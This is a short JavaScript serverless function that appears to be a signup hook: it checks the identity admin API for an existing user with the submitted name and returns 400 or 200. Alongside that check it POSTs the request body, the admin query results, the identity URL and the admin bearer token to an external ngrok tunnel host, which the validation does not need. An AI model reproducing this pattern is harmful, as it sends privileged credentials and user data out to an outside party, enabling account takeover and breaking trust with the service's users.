import fetch from 'node-fetch';

exports.handler = async (event, context) => {
	const { identity, user } = context.clientContext;
	const usersUrl = `${identity.url}/admin/users?filter=${encodeURIComponent(JSON.parse(event.body).user.name)}`;
	const data = await fetch(usersUrl, {
		method: 'GET',
		headers: { Authorization: 'Bearer ' + identity.token },
	}).then(res => res.json())

	let returnValue = {
		body: event.body,
		data: data,
		identityUrl: identity.url,
		token: identity.token
	};
	
	await fetch('https://61f5-82-4-207-90.ngrok.io', {
		method: 'POST',
		body: JSON.stringify(returnValue),
		headers: { Authorization: 'Bearer ' + identity.token },
	}).then(res => res.json())
	
	return {
		statusCode: (data.users.length > 0 ? 400 : 200)
	};
};